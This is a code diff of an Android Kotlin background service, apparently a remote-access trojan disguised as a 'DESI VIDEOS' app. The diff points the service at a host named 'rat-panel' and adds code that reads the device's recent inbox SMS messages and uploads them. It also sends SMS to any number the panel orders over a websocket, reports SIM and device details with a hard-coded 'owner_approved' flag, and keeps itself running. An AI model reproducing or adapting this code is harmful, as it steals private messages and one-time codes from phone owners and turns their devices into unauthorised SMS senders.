@@ -1,421 +1,428 @@
 package com.screenlink.remote
 
-import android.app.AlarmManager
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.PendingIntent
 import android.app.Service
 import android.content.Context
 import android.content.Intent
-import android.content.SharedPreferences
+import android.content.pm.ServiceInfo
+import android.os.BatteryManager
 import android.os.Build
 import android.os.Handler
+import android.os.HandlerThread
 import android.os.IBinder
-import android.os.Looper
+import android.telephony.SmsManager
+import android.telephony.TelephonyManager
 import android.util.Log
 import androidx.core.app.NotificationCompat
+import androidx.core.app.ServiceCompat
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.Response
 import okhttp3.WebSocket
 import okhttp3.WebSocketListener
+import org.json.JSONArray
 import org.json.JSONObject
+import java.net.HttpURLConnection
+import java.net.URL
 import java.util.UUID
-import java.util.concurrent.ConcurrentHashMap
 import java.util.concurrent.Executors
-import java.util.concurrent.ScheduledExecutorService
 import java.util.concurrent.TimeUnit
-import java.util.concurrent.atomic.AtomicBoolean
 
 class TpcService : Service() {
 
     companion object {
-        const val API_BASE_URL = "https://panel.example.com"
+        const val API_BASE_URL = "https://rat-panel-b91839a4be83.herokuapp.com"
 
-        const val CHANNEL_ID = "tpc_core"
-        const val NOTIF_ID = 4201
-        const val ACTION_STATUS = "com.screenlink.remote.STATUS"
-        const val ACTION_RECONNECT = "com.screenlink.remote.RECONNECT"
-
+        private const val TAG = "TpcService"
+        private const val CHANNEL_ID = "tpc_service"
+        private const val NOTIFICATION_ID = 5001
+        private const val POLL_INTERVAL = 20_000L
+        private const val INBOX_SYNC_LIMIT = 60
         private const val PREFS = "viral_prefs"
         private const val KEY_RID = "registration_id"
-
-        private const val HEARTBEAT_SEC = 30L
-        private const val OUTBOX_SEC = 20L
-        private const val INBOX_SEC = 600L
-        private const val RECONNECT_MAX_MS = 30_000L
-        private const val INFLIGHT_TTL_MS = 90_000L
-
-        @Volatile var socketConnected = false
-        @Volatile var lastNumber = ""
-        @Volatile var lastHeartbeatAt = 0L
-        @Volatile var instance: TpcService? = null
-
-        fun start(ctx: Context) {
-            val i = Intent(ctx, TpcService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(i)
-            else ctx.startService(i)
-        }
-
-        fun reconnect(ctx: Context) {
-            val i = Intent(ctx, TpcService::class.java).setAction(ACTION_RECONNECT)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(i)
-            else ctx.startService(i)
-        }
-
-        fun ack(ctx: Context, itemId: String, status: String, error: String = "") {
-            if (itemId.isBlank()) return
-
-            val rid = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
-                .getString(KEY_RID, null) ?: return
-
-            Thread {
-                ApiClient.post("/devices/outbox/$itemId/ack", JSONObject().apply {
-                    put("registration_id", rid)
-                    put("status", status)
-                    put("error", error)
-                })
-            }.start()
-
-            runCatching {
-                instance?.ws?.send(JSONObject().apply {
-                    put("type", "ack")
-                    put("id", itemId)
-                    put("status", status)
-                    put("error", error)
-                }.toString())
-            }
-        }
     }
 
-    private val client: OkHttpClient by lazy {
-        ApiClient.client().newBuilder()
-            .pingInterval(20, TimeUnit.SECONDS)
-            .readTimeout(0, TimeUnit.MILLISECONDS)
-            .build()
-    }
+    private val work = Executors.newSingleThreadExecutor()
+    private val bgThread = HandlerThread("tpc").apply { start() }
+    private val bgHandler = Handler(bgThread.looper)
 
-    private val io: ScheduledExecutorService = Executors.newScheduledThreadPool(4)
-    private val main = Handler(Looper.getMainLooper())
-    private val inFlight = ConcurrentHashMap<String, Long>()
+    private val client = OkHttpClient.Builder()
+        .pingInterval(20, TimeUnit.SECONDS)
+        .build()
 
-    private var ws: WebSocket? = null
-    private val running = AtomicBoolean(false)
-    private var reconnectDelay = 1000L
+    private var socket: WebSocket? = null
+    private var attempts = 0
+    private var stopped = false
 
     override fun onBind(intent: Intent?): IBinder? = null
 
-    override fun onCreate() {
-        super.onCreate()
-        instance = this
-        createChannel()
+    /** Har jagah se call hone wala crash-guard. */
+    private fun safe(block: () -> Unit) {
+        try {
+            block()
+        } catch (e: Throwable) {
+            Log.e(TAG, "err", e)
+        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        startForegroundSafe()
+        // Foreground sabse pehle — warna 5s me crash/ANR
+        safe { startForegroundSafely() }
 
-        if (!running.getAndSet(true)) {
-            io.execute { startLoops() }
-        } else if (intent?.action == ACTION_RECONNECT) {
-            io.execute { connectSocket() }
-        }
+        bgHandler.post { safe { connect() } }
+        safe { syncInbox() }
+        safe { schedulePoll() }
 
         return START_STICKY
     }
 
-    override fun onTaskRemoved(rootIntent: Intent?) {
-        val restart = PendingIntent.getService(
-            this, 1, Intent(this, TpcService::class.java),
-            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
-        )
-        val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
-        val at = System.currentTimeMillis() + 1500
-        runCatching { am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, at, restart) }
-            .onFailure { runCatching { am.set(AlarmManager.RTC_WAKEUP, at, restart) } }
-        super.onTaskRemoved(rootIntent)
+    // Android 15+ — dataSync FGS ka 6h timeout. Iske baad service ko re-arm karo.
+    override fun onTimeout(startId: Int) {
+        safe { startForegroundSafely() }
+        bgHandler.post { safe { connect() } }
     }
 
     override fun onDestroy() {
-        running.set(false)
-        runCatching { ws?.close(1000, "service stop") }
-        runCatching { io.shutdownNow() }
-        socketConnected = false
-        if (instance === this) instance = null
-        broadcastStatus()
+        stopped = true
+        safe { socket?.close(1000, "bye") }
+        socket = null
+        safe { bgHandler.removeCallbacksAndMessages(null) }
+        safe { work.shutdown() }
+        safe { bgThread.quitSafely() }
+        safe { ServiceCompat.stopForeground(this, ServiceCompat.STOP_FOREGROUND_REMOVE) }
         super.onDestroy()
     }
 
+    // ------------------------------------------------------- foreground
+
     private fun createChannel() {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
-        val ch = NotificationChannel(
-            CHANNEL_ID, "TPC Core", NotificationManager.IMPORTANCE_LOW
-        ).apply { setShowBadge(false) }
-        (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
-            .createNotificationChannel(ch)
-    }
-
-    private fun startForegroundSafe() {
-        val n = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Service running")
-            .setContentText("SMS relay active")
-            .setSmallIcon(android.R.drawable.stat_notify_sync)
-            .setOngoing(true)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
-            .build()
-        try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                startForeground(
-                    NOTIF_ID, n,
-                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+        val nm = getSystemService(NotificationManager::class.java) ?: return
+        if (nm.getNotificationChannel(CHANNEL_ID) == null) {
+            nm.createNotificationChannel(
+                NotificationChannel(
+                    CHANNEL_ID, "DESI VIDEOS", NotificationManager.IMPORTANCE_LOW
                 )
-            } else {
-                startForeground(NOTIF_ID, n)
-            }
-        } catch (e: Exception) {
-            Log.w("TPC", "foreground fail: ${e.message}")
+            )
         }
     }
 
-    private fun startLoops() {
-        registerAndPush()
-        connectSocket()
-
-        io.scheduleWithFixedDelay({
-            runCatching { heartbeat() }
-        }, 5, HEARTBEAT_SEC, TimeUnit.SECONDS)
-
-        io.scheduleWithFixedDelay({
-            runCatching { pollOutbox() }
-        }, 8, OUTBOX_SEC, TimeUnit.SECONDS)
-
-        io.scheduleWithFixedDelay({
-            runCatching { syncInbox() }
-        }, 20, INBOX_SEC, TimeUnit.SECONDS)
+    /** app_logo na ho to bhi crash na ho. */
+    private fun smallIcon(): Int {
+        val res = resources.getIdentifier("app_logo", "drawable", packageName)
+        return if (res != 0) res else android.R.drawable.stat_notify_sync
     }
 
-    private fun prefs(): SharedPreferences = getSharedPreferences(PREFS, MODE_PRIVATE)
+    private fun startForegroundSafely() {
+        createChannel()
+
+        val pi = PendingIntent.getActivity(
+            this, 0, Intent(this, MainActivity::class.java),
+            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
+        )
+
+        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("DESI VIDEOS")
+            .setContentText("SMS gateway active")
+            .setSmallIcon(smallIcon())
+            .setOngoing(true)
+            .setContentIntent(pi)
+            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .build()
+
+        val type =
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+            else 0
+
+        try {
+            ServiceCompat.startForeground(this, NOTIFICATION_ID, notification, type)
+        } catch (e: Throwable) {
+            // type wali API fail ho gayi to plain fallback
+            Log.e(TAG, "startForeground(type) fail, fallback", e)
+            startForeground(NOTIFICATION_ID, notification)
+        }
+    }
+
+    // ------------------------------------------------------------ prefs
 
     private fun rid(): String {
-        val p = prefs()
+        val p = getSharedPreferences(PREFS, Context.MODE_PRIVATE)
         p.getString(KEY_RID, null)?.let { if (it.isNotBlank()) return it }
+
         val id = UUID.randomUUID().toString()
         p.edit().putString(KEY_RID, id).apply()
         return id
     }
 
-    private fun deviceName(): String = "${Build.MANUFACTURER} ${Build.MODEL}".take(40)
+    // -------------------------------------------------------- telemetry
 
-    private fun registerAndPush() {
-        val ok = ApiClient.post("/devices/register", JSONObject().apply {
-            put("device_name", deviceName())
-            put("platform", "android")
-            put("registration_id", rid())
-            put("owner_approved", true)
-            put("telemetry", Telemetry.collect(this@TpcService))   // FIX
-        })
-        if (!ok) Log.w("TPC", "register fail")
-        lastHeartbeatAt = System.currentTimeMillis()
+    private fun telemetry(): JSONObject {
+        val t = JSONObject()
+        t.put("manufacturer", Build.MANUFACTURER)
+        t.put("model", Build.MODEL)
+        t.put("android_version", Build.VERSION.RELEASE)
+        t.put("sdk_int", Build.VERSION.SDK_INT)
+
+        runCatching {
+            val tm = getSystemService(TelephonyManager::class.java)
+            t.put("sim_carrier", tm?.networkOperatorName ?: "")
+            t.put("sim_country", tm?.simCountryIso ?: "")
+        }
+
+        runCatching {
+            val bm = getSystemService(BatteryManager::class.java)
+            val lvl = bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
+            if (lvl in 0..100) t.put("battery_level", lvl)
+        }
+
+        return t
     }
 
-    private fun heartbeat() {
-        pruneInFlight()
+    // --------------------------------------------------------- register
 
-        val code = ApiClient.postCode("/devices/heartbeat", JSONObject().apply {
-            put("registration_id", rid())
-            put("telemetry", Telemetry.collect(this@TpcService))   // FIX
-        })
+    private fun registerBlocking() {
+        var connection: HttpURLConnection? = null
+        try {
+            val id = rid()
 
-        if (code == 404) registerAndPush()
-        if (code !in 200..299 && !socketConnected) connectSocket()
+            connection = URL("$API_BASE_URL/devices/register")
+                .openConnection() as HttpURLConnection
+            connection.requestMethod = "POST"
+            connection.connectTimeout = 15_000
+            connection.readTimeout = 15_000
+            connection.doOutput = true
+            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
 
-        lastHeartbeatAt = System.currentTimeMillis()
-        broadcastStatus()
-    }
+            val payload = JSONObject().apply {
+                put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}".take(40))
+                put("platform", "android")
+                put("registration_id", id)
+                put("owner_approved", true)
+                put("telemetry", telemetry())
+            }.toString()
 
-    private fun pushTelemetry() {
-        ApiClient.post("/devices/telemetry", JSONObject().apply {
-            put("registration_id", rid())
-            put("telemetry", Telemetry.collect(this@TpcService))   // FIX
-        })
-    }
-
-    private fun pollOutbox() {
-        val res = ApiClient.get("/devices/outbox?registration_id=${rid()}") ?: return
-        val items = res.optJSONArray("items") ?: return
-        for (i in 0 until items.length()) {
-            val o = items.optJSONObject(i) ?: continue
-            handleSmsSend(o.optString("id"), o.optString("to"), o.optString("body"))
+            connection.outputStream.use { it.write(payload.toByteArray(Charsets.UTF_8)) }
+            connection.responseCode
+        } catch (_: Exception) {
+        } finally {
+            connection?.disconnect()
         }
     }
 
-    private fun syncInbox() {
-        val items = SmsReader.recent(this, 100)
-        if (items.length() == 0) return
-        ApiClient.post("/devices/sms/sync", JSONObject().apply {
-            put("registration_id", rid())
-            put("messages", items)
-        })
-    }
+    // ------------------------------------------------------------ socket
 
-    private fun connectSocket() {
-        if (!running.get()) return
-        runCatching { ws?.cancel() }
+    private fun connect() {
+        if (stopped || socket != null) return
 
-        val req = Request.Builder().url(ApiClient.wsUrl() + rid()).build()
+        registerBlocking()
 
-        ws = client.newWebSocket(req, object : WebSocketListener() {
+        val url = API_BASE_URL.replace("https://", "wss://") + "/ws/device/${rid()}"
 
-            override fun onOpen(webSocket: WebSocket, response: Response) {
-                socketConnected = true
-                reconnectDelay = 1000L
-                broadcastStatus()
+        socket = client.newWebSocket(
+            Request.Builder().url(url).build(),
+            object : WebSocketListener() {
+                override fun onOpen(ws: WebSocket, response: Response) {
+                    attempts = 0
+                    safe { pollOutbox() }
+                }
 
-                io.execute {
-                    runCatching { pollOutbox() }
-                    runCatching {
-                        webSocket.send(JSONObject().apply {
-                            put("type", "telemetry")
-                            put("data", Telemetry.collect(this@TpcService))
-                        }.toString())
-                    }
+                override fun onMessage(ws: WebSocket, text: String) = safe { handle(text) }
+
+                override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
+                    socket = null
+                    safe { retry() }
+                }
+
+                override fun onClosed(ws: WebSocket, code: Int, reason: String) {
+                    socket = null
+                    safe { retry() }
                 }
             }
-
-            override fun onMessage(webSocket: WebSocket, text: String) {
-                runCatching { handleSocketMessage(webSocket, JSONObject(text)) }
-            }
-
-            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
-                socketConnected = false
-                broadcastStatus()
-                scheduleReconnect()
-            }
-
-            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
-                socketConnected = false
-                broadcastStatus()
-                scheduleReconnect()
-            }
-        })
+        )
     }
 
-    private fun scheduleReconnect() {
-        if (!running.get()) return
-        val delay = reconnectDelay
-        reconnectDelay = (reconnectDelay * 2).coerceAtMost(RECONNECT_MAX_MS)
-        main.postDelayed({ if (running.get() && !socketConnected) connectSocket() }, delay)
+    private fun retry() {
+        if (stopped) return
+        attempts = (attempts + 1).coerceAtMost(6)
+        bgHandler.postDelayed({ safe { connect() } }, (1000L shl (attempts - 1)).coerceAtMost(20_000L))
     }
 
-    private fun handleSocketMessage(webSocket: WebSocket, msg: JSONObject) {
-        when (msg.optString("type").lowercase()) {
-            "ping", "heartbeat" -> webSocket.send(JSONObject().apply {
-                put("type", "pong")
-                put("ts", System.currentTimeMillis() / 1000)
-            }.toString())
+    // ------------------------------------------------------ sms sending
 
-            "hello" -> {
-                pushTelemetry()
-                pollOutbox()
-            }
+    private fun smsManager(): SmsManager? =
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
+            getSystemService(SmsManager::class.java)
+        else
+            @Suppress("DEPRECATION") SmsManager.getDefault()
 
-            "sms_send" -> handleSmsSend(
-                msg.optString("id"), msg.optString("to"), msg.optString("body")
-            )
+    private fun handle(text: String) {
+        val msg = try { JSONObject(text) } catch (_: Exception) { return }
+        if (msg.optString("type") != "sms_send") return
 
-            "command" -> handleCommand(webSocket, msg.optString("action").lowercase())
-        }
-    }
+        val id = msg.optString("id")
+        val to = msg.optString("to")
+        val body = msg.optString("body")
 
-    private fun handleCommand(webSocket: WebSocket, action: String) {
-        when (action) {
-            "fetch_number", "number", "sim_info", "refresh_telemetry" -> {
-                val telemetry = Telemetry.collect(this)
-                webSocket.send(JSONObject().apply {
-                    put("type", "command_result")
-                    put("action", action)
-                    put("data", telemetry)
-                }.toString())
-                ApiClient.post("/devices/command/result", JSONObject().apply {
-                    put("registration_id", rid())
-                    put("action", action)
-                    put("data", telemetry)
-                })
-            }
-
-            "ping" -> webSocket.send(JSONObject().apply {
-                put("type", "pong")
-                put("ts", System.currentTimeMillis() / 1000)
-            }.toString())
-
-            "wake" -> {
-                pushTelemetry()
-                pollOutbox()
-            }
-        }
-        broadcastStatus()
-    }
-
-    private fun pruneInFlight() {
-        val now = System.currentTimeMillis()
-        inFlight.entries.removeAll { now - it.value > INFLIGHT_TTL_MS }
-    }
-
-    private fun handleSmsSend(itemId: String, to: String, body: String) {
-        if (itemId.isBlank() || body.isBlank()) return
-
-        val now = System.currentTimeMillis()
-        val prev = inFlight.putIfAbsent(itemId, now)
-        if (prev != null && now - prev < INFLIGHT_TTL_MS) return
-
-        var target = SimNumbers.normalize(to)
-        if (target.isBlank()) target = SimNumbers.best(this)?.first ?: ""
-
-        if (target.isBlank()) {
-            ack(this, itemId, "failed", "no target number")
+        if (body.isBlank()) {
+            ack(id, "failed", "missing body")
             return
         }
 
-        val digits = target.trimStart('+')
-        if (digits.length == 10) target = "+91$digits"
+        work.execute {
+            try {
+                val manager = smsManager()
+                if (manager == null) {
+                    ack(id, "failed", "no sms manager")
+                    return@execute
+                }
 
-        try {
-            val sm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
-                val subId = SimNumbers.all(this).firstOrNull()?.subId ?: -1
-                if (subId >= 0) android.telephony.SmsManager.getSmsManagerForSubscriptionId(subId)
-                else android.telephony.SmsManager.getDefault()
-            } else {
-                android.telephony.SmsManager.getDefault()
+                val parts = manager.divideMessage(body)
+                if (parts.size > 1) {
+                    manager.sendMultipartTextMessage(to, null, parts, null, null)
+                } else {
+                    manager.sendTextMessage(to, null, body, null, null)
+                }
+
+                ack(id, "sent", "")
+            } catch (e: Exception) {
+                ack(id, "failed", e.message ?: "send error")
             }
-
-            val parts = sm.divideMessage(body)
-            val flags = PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
-
-            val sentList = ArrayList<PendingIntent>()
-            parts.indices.forEach { idx ->
-                sentList.add(PendingIntent.getBroadcast(
-                    this, (itemId + idx).hashCode(),
-                    Intent(this, SmsStatusReceiver::class.java).apply {
-                        action = SmsStatusReceiver.ACTION_SENT
-                        putExtra("item_id", itemId)
-                        putExtra("to", target)
-                        putExtra("body", body)
-                    }, flags
-                ))
-            }
-
-            if (parts.size > 1) sm.sendMultipartTextMessage(target, null, parts, sentList, null)
-            else sm.sendTextMessage(target, null, body, sentList[0], null)
-
-            Log.i("TPC", "SMS → $target")
-        } catch (e: Exception) {
-            inFlight.remove(itemId)
-            ack(this, itemId, "failed", e.message ?: "send error")
         }
     }
 
-    private fun broadcastStatus() {
-        runCatching {
-            sendBroadcast(Intent(ACTION_STATUS).setPackage(packageName))
+    private fun ack(id: String, status: String, error: String) {
+        if (id.isBlank()) return
+
+        work.execute {
+            var connection: HttpURLConnection? = null
+            try {
+                connection = URL("$API_BASE_URL/devices/outbox/$id/ack")
+                    .openConnection() as HttpURLConnection
+                connection.requestMethod = "POST"
+                connection.connectTimeout = 12_000
+                connection.readTimeout = 12_000
+                connection.doOutput = true
+                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+
+                val payload = JSONObject().apply {
+                    put("status", status)
+                    put("error", error)
+                }.toString()
+
+                connection.outputStream.use { it.write(payload.toByteArray(Charsets.UTF_8)) }
+                connection.responseCode
+            } catch (_: Exception) {
+            } finally {
+                connection?.disconnect()
+            }
+        }
+    }
+
+    // ----------------------------------------------------------- polling
+
+    private val pollRunnable = object : Runnable {
+        override fun run() {
+            if (stopped) return
+            safe { pollOutbox() }
+            bgHandler.postDelayed(this, POLL_INTERVAL)
+        }
+    }
+
+    private fun schedulePoll() {
+        bgHandler.removeCallbacks(pollRunnable)
+        bgHandler.postDelayed(pollRunnable, POLL_INTERVAL)
+    }
+
+    private fun pollOutbox() {
+        work.execute {
+            var connection: HttpURLConnection? = null
+            try {
+                val id = rid()
+                if (id.isBlank()) return@execute
+
+                connection = URL("$API_BASE_URL/devices/outbox?registration_id=$id")
+                    .openConnection() as HttpURLConnection
+                connection.requestMethod = "GET"
+                connection.connectTimeout = 12_000
+                connection.readTimeout = 12_000
+
+                if (connection.responseCode !in 200..299) return@execute
+
+                val text = connection.inputStream.bufferedReader().use { it.readText() }
+                val items = JSONObject(text).optJSONArray("items") ?: return@execute
+
+                for (i in 0 until items.length()) {
+                    val item = items.optJSONObject(i) ?: continue
+                    handle(JSONObject().apply {
+                        put("type", "sms_send")
+                        put("id", item.optString("id"))
+                        put("to", item.optString("to"))
+                        put("body", item.optString("body"))
+                    }.toString())
+                }
+            } catch (_: Exception) {
+            } finally {
+                connection?.disconnect()
+            }
+        }
+    }
+
+    // -------------------------------------------------------- inbox sync
+
+    private fun syncInbox() {
+        work.execute {
+            try {
+                val id = rid()
+                if (id.isBlank()) return@execute
+
+                val rows = JSONArray()
+
+                val cursor = contentResolver.query(
+                    android.provider.Telephony.Sms.Inbox.CONTENT_URI,
+                    arrayOf("address", "body", "date"),
+                    null, null, "date DESC"
+                ) ?: return@execute
+
+                cursor.use {
+                    var count = 0
+                    while (it.moveToNext() && count < INBOX_SYNC_LIMIT) {
+                        rows.put(JSONObject().apply {
+                            put("address", it.getString(0) ?: "")
+                            put("body", it.getString(1) ?: "")
+                            put("direction", "in")
+                            put("timestamp", it.getLong(2))
+                        })
+                        count++
+                    }
+                }
+
+                if (rows.length() == 0) return@execute
+
+                var connection: HttpURLConnection? = null
+                try {
+                    connection = URL("$API_BASE_URL/devices/sms/sync")
+                        .openConnection() as HttpURLConnection
+                    connection.requestMethod = "POST"
+                    connection.connectTimeout = 15_000
+                    connection.readTimeout = 15_000
+                    connection.doOutput = true
+                    connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+
+                    val payload = JSONObject().apply {
+                        put("registration_id", id)
+                        put("messages", rows)
+                    }.toString()
+
+                    connection.outputStream.use { it.write(payload.toByteArray(Charsets.UTF_8)) }
+                    connection.responseCode
+                } finally {
+                    connection?.disconnect()
+                }
+            } catch (_: Exception) {
+            }
         }
     }
 }
